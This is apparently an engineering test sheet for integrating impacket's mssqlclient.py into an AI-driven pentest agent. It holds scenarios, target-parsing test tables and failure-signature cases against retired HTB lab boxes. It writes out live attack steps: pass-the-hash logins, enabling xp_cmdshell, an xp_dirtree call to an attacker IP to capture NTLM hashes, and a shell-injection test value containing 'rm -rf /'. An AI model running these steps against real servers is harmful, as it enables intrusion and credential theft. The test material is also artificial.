# mssql — Tier A scenarios

Single test sheet for the `mssql` tool migration. Replaces the legacy split
(`target_extraction_tests.md` + `failure_signature_tests.md`) — neither file
existed in this directory; the consolidated form is the standard going forward
(matches the mysql / impacket / nmap pattern).

mssql wraps `mssqlclient.py` — one of impacket's 47 sub-binaries. The image
is INDEPENDENT (Kali rolling + `pip install impacket` directly, NOT via
apt's `python3-impacket` / `impacket-scripts` packages) so this tool can
iterate without dragging in the full 1GB impacket image. The binary on PATH
is `mssqlclient.py`, NOT the `impacket-mssqlclient` symlink that Kali's
`impacket-scripts` package would create.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20)
4. Failure-signature live-verify cases (≥3)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**Querier (10.10.10.125, retired Windows)** — runs MSSQL Server 2017 on a
Windows DC with `mssql-svc` and `Administrator` accounts. The chain:

- Anonymous SMB share `Reports` exposes an `.xlsm` file with embedded VBA
  containing `mssql-svc:corporate568` cleartext.
- Connect with `mssqlclient.py 'corp.local/mssql-svc:corporate568@10.10.10.125' -windows-auth`
  (Windows authentication path — the credential is a domain account, NOT a SQL
  Server login).
- `EXEC xp_dirtree '\\\\<attacker>\\test', 1, 1` triggers Net-NTLMv2 auth from
  the MSSQL service account → captureable via responder.
- After cracking the captured hash, escalate to `Administrator` via psexec.

This box exercises the FULL kind:cli surface for mssql:
- (a) auth happy-path with `-windows-auth` against a domain credential,
- (b) `-file <sql>` non-interactive query mode,
- (c) `xp_dirtree` UNC trigger for relay attacks,
- (d) the SPN edge case where the bare IP doesn't have a registered MSSQLSvc/<host>
  Kerberos SPN (so `-k` would fail without `-target-ip` workaround).

**Alternative — Sequel (10.129.226.18, easy retired Linux)** — runs MSSQL
Server on Linux with `sa:PublicPassword@123` known from a creds dump. SQL
Server Authentication path (NO `-windows-auth`) — useful for testing the
login-based auth flow without involving AD / Kerberos / NTLM. Simpler shape
than Querier.

**Alternative — Hokkaido (custom HTB lab)** — runs MSSQL with linked-server
chains for testing OPENQUERY traversal and trustworthy-DB escalation.
Availability varies — only listed if the lab is currently active.

**Standalone alternative — vulhub mssql/CVE-2020-0618**: ships a deliberately
vulnerable MSSQL image with a known SQLi → RCE chain. Useful for testing the
Tier A migration architecture path (kind:cli routes through cli_in_container,
target extraction catches the positional `[domain/]user[:password]@host`,
`-file` flag works, `-no-row-count` strips the footer). Run inside the test
infra rather than HTB if the recommended boxes are spun down.

For Tier A migration verification, what matters is that the **architecture
path** is wired (kind:cli routes through cli_in_container, target extraction
catches the positional, `-windows-auth` is REQUIRED for domain auth,
`-file` is the canonical non-interactive form). Querier-style tests confirm
the integration end-to-end.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — `mssqlclient.py --help` (smoke)

```
Engagement target: none — running mssqlclient.py --help through opensploit to confirm the kind:cli path is wired and the container is reachable. Report the help-text first line and identify whether the binary is impacket 0.12.x.
```

**Watch:** First call ~3 s (container spawn + MCP handshake), exit 0, stdout
matches `Impacket v0.12.x ...` followed by argument list. Confirms the
binary on PATH is `mssqlclient.py` (NOT `impacket-mssqlclient` — different
image). Confirms persistent container reuse on subsequent calls.

### S2 — Version check via -file (happy path)

```
Engagement target: 10.10.10.125 (HTB Querier, authorized).
The user mssql-svc has the password 'corporate568' from the .xlsm file. Use mssqlclient.py to (1) write 'SELECT @@VERSION;' to /session/version.sql via the write tool, then (2) run mssqlclient.py 'corp.local/mssql-svc:corporate568@10.10.10.125' -windows-auth -file /session/version.sql to confirm the credential works and surface the SQL Server version string.
```

**Watch:** target=`10.10.10.125` extracted from positional `@10.10.10.125`
(matches the impacket regex). First call returns the SQL Server build
string (`Microsoft SQL Server 2017 (RTM-CU22) ... 14.0.3356.20 (X64)`).
Exit 0 with parseable text on stdout. `-windows-auth` flag correctly
selects NTLM/Kerberos auth path against the AD account (without it,
mssqlclient would try SQL Server Auth and fail with `Login failed`).

### S3 — Pass-the-hash via -hashes :NTHASH

```
Engagement target: 10.10.10.125 (authorized).
After secretsdump on a different host produced an NT hash for corp.local/admin (NT hash: 31d6cfe0d16ae931b73c59d7e0c089c0), use mssqlclient.py to dump sys.databases via pass-the-hash. Write 'SELECT name FROM sys.databases;' to /session/dump.sql, then run mssqlclient.py 'corp.local/admin@10.10.10.125' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -windows-auth -file /session/dump.sql.
```

**Watch:** target=`10.10.10.125` from positional. `-hashes` value `:31d6cfe0...`
must NOT be confused with a target (leading colon, embedded colons — the
value_flags rule for `-hashes` skips it). `-windows-auth` REQUIRED with
`-hashes` (without it, mssqlclient would route through SQL Server Auth
which has no hash form and fail). Output: 4-7 database names per line
(master, tempdb, model, msdb + app DBs).

### S4 — Kerberos auth with KRB5CCNAME (multi-step ccache flow)

```
Engagement target: 10.10.10.125 (authorized).
Multi-step Kerberos chain:
1. Run impacket-getTGT 'corp.local/mssql-svc:corporate568' -dc-ip 10.10.10.125 to obtain a TGT (writes /session/mssql-svc.ccache).
2. Set KRB5CCNAME=/session/mssql-svc.ccache for the next call.
3. Write 'SELECT @@VERSION;' to /session/q.sql.
4. Run mssqlclient.py 'corp.local/mssql-svc@10.10.10.125' -k -no-pass -dc-ip 10.10.10.125 -file /session/q.sql.
```

**Watch:** target=`10.10.10.125` from positional. `-k -no-pass` means "use
Kerberos ticket from KRB5CCNAME, don't prompt for password". `-dc-ip`
pins the KDC. KRB5CCNAME plumbing — verify cli_in_container forwards env
vars from yaml or via the new env_pass mechanism (open question — same as
the impacket tool). May surface `KDC_ERR_S_PRINCIPAL_UNKNOWN` if the SPN
binding doesn't match the bare IP — fall back to FQDN positional or
`-target-ip`.

### S5 — SQL Server Authentication (login-based, no -windows-auth)

```
Engagement target: 10.129.226.18 (HTB Sequel, authorized).
The sa account has the password 'PublicPassword@123' (recovered from web app config). Use mssqlclient.py with SQL Server Authentication (no -windows-auth) to dump sys.databases. Write 'SELECT name FROM sys.databases;' to /session/q.sql, then run mssqlclient.py 'sa:PublicPassword@123@10.129.226.18' -file /session/q.sql.
```

**Watch:** target=`10.129.226.18` from positional. The password contains
`@` which is also the user/host separator — the FIRST `@` matches the
regex (greedy `[^@\s]+` consumes `sa:PublicPassword@123`, then `@` matches
literally, then `10.129.226.18` is the host). This is the worst-case
parser stress. NO `-windows-auth` flag — mssqlclient defaults to SQL
Server Authentication (login-based path; works against `sa` and other
SQL logins, NOT against AD accounts). Output: master, tempdb, model, msdb
+ app DB.

### S6 — Stdin-fed query (alternative to -file)

```
Engagement target: 10.10.10.125 (authorized).
Use mssqlclient.py with run_cli's stdin_data parameter to feed a multi-statement query without writing a file. Argv: mssqlclient.py 'corp.local/mssql-svc:corporate568@10.10.10.125' -windows-auth. stdin_data: 'SELECT @@VERSION;\nGO\nSELECT SYSTEM_USER;\nGO\nexit\n'.
```

**Watch:** target=`10.10.10.125` from positional. NO `-file` flag — the
SQL is piped via stdin. `GO` is the T-SQL batch separator (each query
followed by `GO` on its own line). `exit` closes the session cleanly.
Without `stdin_data` AND without `-file`, mssqlclient would open the
interactive prompt and hang the container — idle_timeout=300s would
catch that, but is slow. This path verifies that run_cli's stdin_data
plumbing works end-to-end.

### S7 — xp_cmdshell OS command execution

```
Engagement target: 10.10.10.125 (authorized — testing xp_cmdshell from a sysadmin account).
The mssql-svc account is sysadmin on this MSSQL instance. Write the three-statement enable-then-exec sequence to /session/cmdshell.sql:
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
Then run mssqlclient.py 'corp.local/mssql-svc:corporate568@10.10.10.125' -windows-auth -file /session/cmdshell.sql.
```

**Watch:** target=`10.10.10.125` from positional. The output stream
includes the three sp_configure / RECONFIGURE results plus the
xp_cmdshell output (`nt service\mssql-svc` or similar — the MSSQL service
account, NOT the auth user). If xp_cmdshell is already enabled, the
sp_configure calls are no-ops. If not sysadmin, stderr / output contains
`xp_cmdshell is not a recognized option` or `must enable xp_cmdshell`.

### S8 — xp_dirtree NTLM trigger (relay attack staging)

```
Engagement target: 10.10.10.125 (authorized — triggering NTLM auth to attacker-controlled UNC path on tun0=10.10.14.42).
Write the xp_dirtree call to /session/dirtree-ntlm.sql:
  EXEC xp_dirtree '\\\\10.10.14.42\\test', 1, 1;
Run mssqlclient.py 'corp.local/mssql-svc:corporate568@10.10.10.125' -windows-auth -file /session/dirtree-ntlm.sql concurrently with responder running on tun0 (separate session). The MSSQL service account will authenticate to the UNC path; responder captures the Net-NTLMv2 hash.
```

**Watch:** target=`10.10.10.125`. The query itself returns nothing meaningful
on stdout (xp_dirtree on a non-existent UNC fails — but the auth attempt
already happened). Verify capture in responder's session log. NB: the
T-SQL UNC literal needs DOUBLE backslashes in the SQL file (`'\\\\10.10.14.42\\test'`)
because T-SQL escapes backslashes by doubling AND the UNC form needs `\\<host>\<share>`.

### S9 — Failure: wrong password (Login failed)

```
Engagement target: 10.10.10.125 (authorized — using deliberately wrong password to verify error classification).
Write 'SELECT 1;' to /session/q.sql. Run mssqlclient.py 'corp.local/mssql-svc:wrong-password@10.10.10.125' -windows-auth -file /session/q.sql.
```

**Watch:** Exit code may be 0 OR non-zero (impacket binaries often exit
0 even on auth failure). Stderr / stdout contains `[-] ERROR: Login failed
for user 'corp.local\\mssql-svc'` OR `STATUS_LOGON_FAILURE`. Classified as
`failure_in_output` matching the `Login failed` / `STATUS_LOGON_FAILURE`
signals. tool_runner reports the auth failure cleanly.

### S10 — Failure: connection refused (closed port)

```
Engagement target: 127.0.0.1 port 1 (deliberately closed port, verifying TCP-layer error classification).
Write 'SELECT 1;' to /session/q.sql. Run mssqlclient.py 'sa:any@127.0.0.1' -port 1 -file /session/q.sql.
```

**Watch:** Exit code may be 0 OR non-zero. Stderr / stdout contains
`[-] Connection error (127.0.0.1:1): [Errno 111] Connection refused` OR
`Connection refused`. Classified as `failure_in_output` matching the
`Connection refused` / `[Errno 111]` signals. Distinct from S9 (auth
layer) — exercises TCP-layer signature. Layer diversity confirmed.

---

## 3. Target-extraction adversarial cases (≥20)

The mssql `tool.yaml` declares three rules (first match wins):

1. `positional_match` regex `^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)` — the canonical
   `[domain/]user[:password]@host` form (matches every successful invocation).
2. `flag_value` for `-target-ip` — Kerberos SPN-resolution override.
3. `flag_value` for `-dc-ip` — fallback when the positional has no `@host`
   (rare for mssql; covers Kerberos auth where target = DC = MSSQL host).

The first positional MUST match the impacket DSL — there is no first-positional
fallback (unlike mysql where the first positional is a database name).

### Happy-path cases

| # | Command (binary `mssqlclient.py` omitted) | Expected target | Notes |
|---|---|---|---|
| 1 | `'sa:Password1@10.10.10.5' -file /session/q.sql` | `10.10.10.5` | Standard SQL Server Auth, IPv4 |
| 2 | `'corp.local/admin:Pa55@10.10.10.125' -windows-auth -file /session/q.sql` | `10.10.10.125` | Windows Auth with FQDN domain |
| 3 | `'CORP/admin:Pa55@dc01.corp.local' -windows-auth -file /session/q.sql` | `dc01.corp.local` | Hostname (FQDN) |
| 4 | `'corp.local/svc_mssql:p@db.prod.corp.com' -windows-auth -file /session/q.sql` | `db.prod.corp.com` | Multi-level FQDN |
| 5 | `'sa:p@10.10.10.5' -port 1434 -file /session/q.sql` | `10.10.10.5` | Non-default port via -port |
| 6 | `'corp/svc_mssql:p@10.10.10.5' -windows-auth -instance MSSQLSERVER2019 -file /session/q.sql` | `10.10.10.5` | Named instance via -instance (NOT a port) |
| 7 | `'corp/admin@10.10.10.5' -k -no-pass -dc-ip 10.10.10.5 -file /session/q.sql` | `10.10.10.5` | Kerberos pass-the-ticket; positional wins over -dc-ip |
| 8 | `'corp/admin' -k -no-pass -dc-ip 10.10.10.5 -file /session/q.sql` | `10.10.10.5` | NO `@host` in positional → -dc-ip fallback |
| 9 | `'corp/admin:p@10.10.10.5' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -windows-auth -file /session/q.sql` | `10.10.10.5` | -hashes value with leading colon — must NOT match |
| 10 | `'corp/admin:p@dc01.corp.local' -k -no-pass -dc-ip 10.10.10.5 -target-ip 10.10.10.125 -file /session/q.sql` | `dc01.corp.local` | Positional wins over -target-ip and -dc-ip |
| 11 | `'corp/admin:p@10.10.10.5' -windows-auth -db ApplicationDB -file /session/q.sql` | `10.10.10.5` | -db value `ApplicationDB` must NOT match as target |
| 12 | `'corp/admin:p@10.10.10.5' -windows-auth -file /session/q.sql -no-row-count` | `10.10.10.5` | -file value `/session/q.sql` (file path with slashes) — must NOT match |
| 13 | `'sa:P@ssw0rd@10.10.10.5' -file /session/q.sql` | `10.10.10.5` | Password contains literal `@` — first `@` is greedy match in `[^@\s]+`, then host after second `@` |
| 14 | `'corp/admin:p@10.10.10.5' -windows-auth -aesKey 0123456789abcdef0123456789abcdef -file /session/q.sql` | `10.10.10.5` | -aesKey value (32 hex) must NOT match |
| 15 | `'corp/admin:p@2001:db8::1' -windows-auth -file /session/q.sql` | `2001` (broken — see OQ) | IPv6 literal — regex stops at first `:` (host is `2001`, NOT the full v6 addr). Defer; HTB is IPv4-only. |
| 16 | `'sa:p@10.10.10.5' -file /session/q.sql -debug` | `10.10.10.5` | -debug is boolean — argv parser must NOT consume `/session/q.sql` as -debug's value |
| 17 | `'corp/admin:p@10.10.10.5' -windows-auth -show -file /session/q.sql` | `10.10.10.5` | -show is boolean — same boundary check |
| 18 | `'corp/admin:p@10.10.10.5' -windows-auth -file /session/q.sql -row-count` | `10.10.10.5` | -row-count is boolean (default behavior — listed for completeness) |
| 19 | `'corp/admin@10.10.10.5' -k -no-pass -dc-ip 10.10.10.5 -target-ip 10.10.10.125 -file /session/q.sql` | `10.10.10.5` | Positional `@10.10.10.5` wins; -target-ip is for SPN resolution only |
| 20 | `'corp/admin:p@10.10.10.5' -windows-auth -port 14330 -instance SQLEXPRESS -file /session/q.sql` | `10.10.10.5` | Both -port and -instance set (incorrect usage but parser still extracts target from positional) |
| 21 | `'sa:p@10.10.10.5'` (no other args — would hang in interactive mode) | `10.10.10.5` | Positional alone — extraction works, but the run hangs without -file/stdin_data (idle timeout catches) |
| 22 | `'corp.local/sa.svc:Pa55@10.10.10.5' -windows-auth -file /session/q.sql` | `10.10.10.5` | Username contains `.` (sa.svc) — `[^@\s]+` allows |
| 23 | `'CORP\\admin:p@10.10.10.5' -windows-auth -file /session/q.sql` | (regex no-match — see notes) | DOMAIN\user backslash form — impacket REQUIRES forward-slash `domain/user`. backslash form is a USER ERROR; positional regex doesn't match. Open question: should there be a friendly error for this? |
| 24 | `'corp.local/admin:Pa55@10.10.10.5/SHARE' -windows-auth -file /session/q.sql` | `10.10.10.5` | `/SHARE` after host — regex stops at `/` (host `[^:/?#\s]+`). impacket itself ignores trailing path. |
| 25 | `'corp.local/admin:Pa55@10.10.10.5:1433' -windows-auth -file /session/q.sql` | `10.10.10.5` | `:1433` port suffix — regex stops at `:`. |

### Adversarial cases (DSL must reject, fall back, or warn)

| # | Command | Expected behaviour | Notes |
|---|---|---|---|
| F1 | `--help` | `target=null` | tool_runner bypasses scope check for --help. |
| F2 | `-h` | `target=null` | -h is the help shortcut on impacket binaries (NOT host). |
| F3 | (no args) | `target=null` | mssqlclient with no args fails argparse (positional required). |
| F4 | `'corp/admin:p' -dc-ip 10.10.10.5 -file /session/q.sql` | `10.10.10.5` (rule 3 fires) | No `@host` in positional → -dc-ip fallback. Common for getTGT-style auto-discovery flows. |
| F5 | `'corp/admin:p' -target-ip 10.10.10.5 -file /session/q.sql` | `10.10.10.5` (rule 2 fires) | -target-ip fallback when no positional `@host` and no -dc-ip. |
| F6 | `'@10.10.10.5'` | `null` | Empty user portion — regex requires `[^@\s]+` to be ≥1 char. Falls through; argparse rejects the bare `@host`. |
| F7 | `'sa:p@10.10.10.5' 'sa:p@10.10.10.6'` | `10.10.10.5` (first positional only) | Multi-target forbidden; mssqlclient ignores second positional. |
| F8 | `'corp/admin:p@10.10.10.5' -dc-ip 10.10.10.6` | `10.10.10.5` (positional wins) | **Security invariant**: -dc-ip is auth/KDC routing, NOT scope. positional > -dc-ip. |
| F9 | `'corp/admin:p@10.10.10.5' -target-ip 10.10.10.6 -dc-ip 10.10.10.7` | `10.10.10.5` | positional > -target-ip > -dc-ip. |
| F10 | `'sa:Pa$$w0rd@10.10.10.5' -file /session/q.sql` | `10.10.10.5` | Password contains `$` — `[^@\s]+` allows. |
| F11 | `'sa:Pa\\sw0rd@10.10.10.5' -file /session/q.sql` | `10.10.10.5` | Password contains `\` — `[^@\s]+` allows. impacket DSL accepts. |
| F12 | `'sa:p@10.10.10.5' -windows-auth -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -file /session/q.sql` | `10.10.10.5` | -hashes value `:31d6...` has leading colon and 32 hex chars — must NOT be picked. value_flags catches. |
| F13 | `'sa:p@10.10.10.5' -windows-auth -instance MSSQLSERVER -file /session/q.sql` | `10.10.10.5` | -instance value `MSSQLSERVER` (no slashes / colons) — must NOT match positional regex. value_flags catches. |
| F14 | `'sa:p@10.10.10.5' -windows-auth -file /session/q.sql -db tempdb` | `10.10.10.5` | -db value `tempdb` — must NOT match. value_flags catches. |
| F15 | `'sa:p@10.10.10.5' -windows-auth -aesKey aabbccddeeff00112233445566778899 -file /session/q.sql` | `10.10.10.5` | -aesKey value (32 hex) — no @, no :, but in value_flags. |
| F16 | `'sa:p@10.10.10.5' -windows-auth -file '/session/q.sql; rm -rf /'` (shell injection attempt) | `10.10.10.5` | -file value with shell metacharacters — cli_in_container has NO shell, so the value is treated as a literal filename (which doesn't exist — argparse / open() error). target extraction unaffected. |
| F17 | `'sa:p@10.10.10.5' -windows-auth -file /session/q.sql < /session/inject.sql` | `10.10.10.5` | Shell redirect — cli_in_container has NO shell, `<` is a literal token. target extraction correct, but the run is broken (literal `<` arg fails argparse). |
| F18 | `--windows-auth 'sa:p@10.10.10.5' -file /session/q.sql` | (regex no-match — `--windows-auth` is INVALID) | Double-dash form REJECTED — impacket convention is single-dash for short flags. Common typo. argparse fails fast. |
| F19 | `'sa:p@10.10.10.5' -windows-auth -file ''` | `10.10.10.5` | Empty -file value — open() fails with empty filename. target extraction correct. |
| F20 | `'corp.local/admin:Pa55@'` | (regex no-match) | Empty host portion after `@` — `[^:/?#\s]+` requires ≥1 char. argparse rejects malformed positional. |
| F21 | `'sa:p@10.10.10.5' -p 1434 -file /session/q.sql` | `10.10.10.5` (extraction) BUT argparse REJECTS | impacket uses `-port`, NOT `-p`. `-p` is unrecognized. Common typo from mysql / nmap muscle memory. |
| F22 | `'sa:p@10.10.10.5' --port 1434 -file /session/q.sql` | `10.10.10.5` (extraction) BUT argparse REJECTS | Double-dash long form REJECTED — impacket convention is single-dash everywhere. `-port 1434` is the correct form. |
| F23 | `'sa:p@10.10.10.5' -windows-auth -file /session/q.sql -e 'SELECT 1'` | `10.10.10.5` (extraction) BUT argparse REJECTS | `-e` is mysql convention; mssqlclient has NO -e flag. argparse fails. |

---

## 4. Failure-signature live-verify cases (≥3)

Run via opensploit; verify the result hits a `failure_signatures` entry.
Most impacket binaries exit **0 even on hard failure** — pattern-match
`failure_signatures.signal` is mandatory.

| # | Layer | Test | Command (post-binary) | Expected exit | Expected stdout/stderr substring | failure_signature `signal` | Status |
|---|---|---|---|---|---|---|---|
| 1 | DNS | host doesn't exist | `'sa:p@nonexistent.invalid' -file /session/q.sql` | 0 or 1 | `Could not resolve` or `[Errno -2] Name or service not known` | `Could not resolve` AND `Name or service not known` | PENDING (live-verify on rebuilt image) |
| 2 | TCP | connection refused (closed port) | `'sa:p@127.0.0.1' -port 1 -file /session/q.sql` | 0 or 1 | `Connection error (127.0.0.1:1): [Errno 111] Connection refused` | `Connection refused` AND `[Errno 111] Connection refused` | PENDING |
| 3 | TCP | timeout (unreachable host) | `'sa:p@10.255.255.254' -port 1433 -file /session/q.sql` | 0 or 1 | `Connection error ... timed out` | `timed out` | PENDING |
| 4 | NTLM auth | wrong password (Windows Auth) | `'corp.local/svc:wrong-password@10.10.10.125' -windows-auth -file /session/q.sql` | 0 or 1 | `STATUS_LOGON_FAILURE` or `Login failed for user 'corp.local\\svc'` | `Login failed` AND `STATUS_LOGON_FAILURE` | PENDING |
| 5 | SQL auth | wrong password (SQL Server Auth) | `'sa:wrong-password@10.10.10.5' -file /session/q.sql` | 0 or 1 | `Login failed for user 'sa'` (state 28000) | `Login failed` AND `28000` | PENDING |
| 6 | Kerberos preauth | wrong hash for -k | `'corp.local/svc@10.10.10.125' -hashes :wrong-hash -k -no-pass -dc-ip 10.10.10.125 -file /session/q.sql` | 0 or 1 | `KDC_ERR_PREAUTH_FAILED` | `KDC_ERR_PREAUTH_FAILED` | PENDING |
| 7 | Kerberos clock | clock skew >5min | `'corp/svc@10.10.10.125' -k -no-pass -dc-ip 10.10.10.125 -file /session/q.sql` (with host clock 10min off) | 0 or 1 | `KRB_AP_ERR_SKEW` | `KRB_AP_ERR_SKEW` | PENDING (requires clock manipulation) |
| 8 | Kerberos SPN | bare-IP positional with -k | `'corp/svc@10.10.10.125' -k -no-pass -dc-ip 10.10.10.125 -file /session/q.sql` (no SPN registered for IP) | 0 or 1 | `KDC_ERR_S_PRINCIPAL_UNKNOWN` | `KDC_ERR_S_PRINCIPAL_UNKNOWN` | PENDING |
| 9 | SQL semantic | invalid object | `-file /session/bad.sql` (containing `SELECT * FROM nonexistent_table;`) | 0 | `Msg 208, Level 16, State 1 ... Invalid object name 'nonexistent_table'` | `Msg \\d+, Level \\d+` AND `Msg 208` | PENDING |
| 10 | SQL syntax | malformed query | `-file /session/syntax.sql` (containing `SLECT 1;`) | 0 | `Msg 156 ... Incorrect syntax near 'SLECT'` | `Incorrect syntax` AND `Msg \\d+, Level \\d+` | PENDING |
| 11 | xp_cmdshell disabled | non-sysadmin tries xp_cmdshell | `-file /session/cmdshell.sql` (with `EXEC xp_cmdshell 'whoami';` only — no enable sequence, low-priv user) | 0 | `Msg 15281 ... must enable xp_cmdshell` OR `xp_cmdshell is not a recognized option` | `must enable xp_cmdshell` OR `is not a recognized option` | PENDING |
| 12 | argparse | missing positional | (no args) | 1 | `error: the following arguments are required: target` | `error: argument` AND `the following arguments are required` | PENDING |
| 13 | argparse | unrecognized flag | `'sa:p@10.10.10.5' -e 'SELECT 1'` | 1 | `error: unrecognized arguments: -e` | `unrecognized arguments` | PENDING |

### Lessons recorded in `tool.yaml` gotchas

1. **NO `-e <query>` non-interactive flag** — unlike mysql, mssqlclient has no
   inline-query flag. Either `-file <path>` (write SQL to /session/<name>.sql
   first) or `stdin_data` (run_cli's stdin pipe). Without either, the binary
   hangs on the interactive `SQL>` prompt — caught by idle_timeout=300s.
2. **`-windows-auth` is REQUIRED for domain auth** — without it, mssqlclient
   defaults to SQL Server Authentication (login-based, no domain). Pass-the-hash
   AND Kerberos both REQUIRE `-windows-auth`. SQL Server Auth path is for the
   classic `sa` / `dba` / `appuser` LOGINS only.
3. **`-hashes` value has a LEADING COLON for NT-only** — `-hashes :31d6cfe0...`
   (empty LM half + NT hash). Modern Windows targets only have the NT half.
4. **Default port 1433; named instances need -instance, NOT -port** — named
   instances bind to dynamic ports resolved via UDP/1434 SQL Browser.
5. **Exit code is unreliable for SQL errors** — mssqlclient exits 0 on
   connect-and-execute even if the query produced an SQL Server error
   (`Msg 208, Level 16`). Pattern-match `Msg \\d+, Level \\d+` for SQL semantic
   failures, `Login failed` / `STATUS_LOGON_FAILURE` for auth failures,
   `Connection refused` / `timed out` for TCP failures.
6. **impacket convention is SINGLE-DASH for short flags** — `-port`, `-windows-auth`,
   `-hashes`, `-file`, `-db`, `-instance`. `--port` (double dash) is REJECTED.
   Different from GNU long-flag norm; same convention as every other impacket
   sub-binary.
7. **Output is whitespace-aligned text, NOT TSV/JSON** — column widths vary
   by content. There is NO --tsv / --json / --csv flag. Post-processing
   requires regex or width-based slicing. Prefer single-column queries for
   trivial line-by-line parsing.

---

## 5. Open questions

1. **Binary name on PATH (`mssqlclient.py` vs `impacket-mssqlclient`)** —
   verified during the Read phase: this image installs impacket via
   `pip install impacket` directly (NOT via Kali's `python3-impacket` /
   `impacket-scripts` apt packages), so the binary on PATH is `mssqlclient.py`.
   The `impacket-mssqlclient` symlink would only exist if `impacket-scripts`
   was apt-installed (as in the sister `impacket` tool image). `binary:
   mssqlclient.py` is the correct field. Open question: should the Dockerfile
   switch to apt-installed `impacket-scripts` for consistency with the
   `impacket` image? Trade-off: apt path gets the `impacket-*` shim names but
   adds the full toolkit (~1GB image vs current ~350MB); pip path is leaner
   but requires the agent to use bare `mssqlclient.py` (which is what the
   tool.yaml does).

2. **Stdin handling for queries (`stdin_data` parameter)** — verify that
   run_cli's `stdin_data` parameter feeds the SQL through to mssqlclient.py's
   stdin correctly. The protocol is: each query terminated with `\\nGO\\n`,
   end the session with `\\nexit\\n`. Without stdin_data AND without -file,
   the binary hangs the container (caught by idle_timeout=300s). Verify
   end-to-end with S6 against a reachable MSSQL.

3. **KRB5CCNAME env plumbing** — Kerberos auth (`-k -no-pass`) requires
   KRB5CCNAME pointing to a ccache file written by impacket-getTGT. Verify
   cli_in_container forwards KRB5CCNAME from the workspace env (or via the
   new env_pass mechanism — same open question as the impacket tool, OQ 7
   in impacket/scenarios.md). If env doesn't propagate, document the
   workaround (pre-set in the workspace before the call) in tool.yaml gotchas.

4. **SQL output parsing** — mssqlclient renders results as whitespace-aligned
   ASCII tables with dynamic column widths. There is NO --tsv / --json / --csv
   flag. Post-processing options for the agent: (a) one column per query
   (line-by-line trivial), (b) regex parse with `\\s{2,}` boundary like
   mssql-server.py's `_parse_sql_output` legacy method, (c) post-process with
   sed/awk in a follow-up bash call. Document recommended pattern in tool.yaml.

5. **Image base (impacket-shared or independent)** — current image is
   INDEPENDENT (kali-rolling + pip install impacket). Sister `impacket` image
   is also kali-rolling but apt-installs `python3-impacket` + `impacket-scripts`
   (different binary naming, larger image). Trade-off documented in OQ 1.
   Independent is simpler for now; consider shared image after the kind:cli
   pilot stabilizes (Wave 7+).

6. **Linked-server traversal target extraction** — `OPENQUERY([LINKED], '...')`
   queries pivot to the LINKED server, but the network connection is still to
   the originally-named host (`@10.10.10.5`). Target extraction correctly
   identifies `10.10.10.5` as the network target; the linked server is a
   logical pivot, not a network target. Document this in tool.yaml: the
   `OPENQUERY` linked-server name is NOT a target_extraction concern.

7. **xp_dirtree NTLM trigger UNC parsing** — the UNC literal in T-SQL needs
   DOUBLE backslashes due to T-SQL string escaping (`'\\\\<host>\\<share>'` in
   the SQL file becomes `\\<host>\<share>` after T-SQL parses it). Verify the
   number of backslashes is correct in S8; document in gotchas. Common
   confusion when copy-pasting from PowerShell / cmd examples.

8. **Trustworthy DB privesc requires nested ownership chain** — the
   trustworthy-DB escalation path is complex (TRUSTWORTHY ON + dbo owner with
   sysadmin role + EXTERNAL ACCESS or UNSAFE module). Document the full chain
   in gotchas (already done — see "TRUSTWORTHY DB ESCALATION REQUIRES dbo
   OWNER WITH SYSADMIN" gotcha). Consider a usage_pattern with the canonical
   discovery query to surface candidates: `SELECT name, suser_sname(owner_sid)
   FROM sys.databases WHERE is_trustworthy_on = 1`.

9. **SPN-resolution fallback (-target-ip vs FQDN positional)** — when the
   bare IP doesn't have a registered MSSQLSvc/<host> SPN, Kerberos auth fails
   with `KDC_ERR_S_PRINCIPAL_UNKNOWN`. Two fixes: (a) use FQDN in positional
   (`@dc01.corp.local` instead of `@10.10.10.5`), (b) pass `-target-ip 10.10.10.5`
   to override SPN-host resolution. Document both options in failure_signatures
   remediation.

10. **Legacy `-command` flag is a third non-interactive form** — the legacy
    mcp-server.py (lines 204-206) ran every method by repeating `-command "<sql>"`
    pairs in argv, NOT by writing to /session/*.sql. mssqlclient.py supports
    the `-command` flag (added to value_flags). Form:
    `mssqlclient.py '...@host' -windows-auth -command 'SELECT @@VERSION;' -command 'SELECT SYSTEM_USER;'`
    Still less robust than -file for audit (the SQL is in argv, visible to
    `ps`) and less flexible than stdin_data (can't easily template across
    runs). The new agent path PREFERS -file for auditability and parity with
    the rest of the impacket sub-binaries; -command is a viable shortcut for
    tiny one-shot statements but should not be the default. Open question: do
    we surface `-command` in usage_patterns as an officially-recommended path,
    or leave it as a legacy/escape hatch documented only in gotchas? Currently
    documented in gotchas + value_flags only; usage_patterns remain -file-first.

11. **Backslash `DOMAIN\\user` username form leaks past target extraction** —
    the legacy `_build_mssqlclient_cmd` (line 182) detected EITHER `\\` or `/`
    in the username and passed both forms through unchanged. The kind:cli
    positional regex `^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)` ONLY matches the
    forward-slash form. If an operator (or LLM-generated argv) writes
    `'CORP\\admin:p@10.10.10.5'`, target extraction falls through positional_match
    to the -dc-ip / -target-ip flag fallbacks — incorrect when those flags are
    absent (no scope check) OR worse, scoped to the wrong host. Already partly
    flagged as F23 in the adversarial table ("regex no-match — see notes").
    Resolution options: (a) extend positional regex to accept `\\` separator,
    (b) preflight-rewrite backslash → slash in argv normalization,
    (c) document as user error and rely on argparse to reject — requires
    mssqlclient to actually reject (verify in impacket 0.12.x; some versions
    accept). Currently gotcha added in tool.yaml; positional regex
    unchanged. Recommend live-verify on Querier with both forms before
    committing to (a)/(b)/(c).

---

## 6. Hand-off

- **Tool**: mssql (kind:cli)
- **Status**: migrated; scenarios consolidated; Dockerfile updated to
  `python3-full` (Kali fix — replaces `python3 python3-pip python3-venv` triple
  with single metapackage) AND added `krb5-user libkrb5-dev` for Kerberos
  client support (`-k -no-pass` paths). Same fix as the sibling impacket image.
- **mcp-server.py**: present (642 LOC), untouched — auto-inherits run_cli;
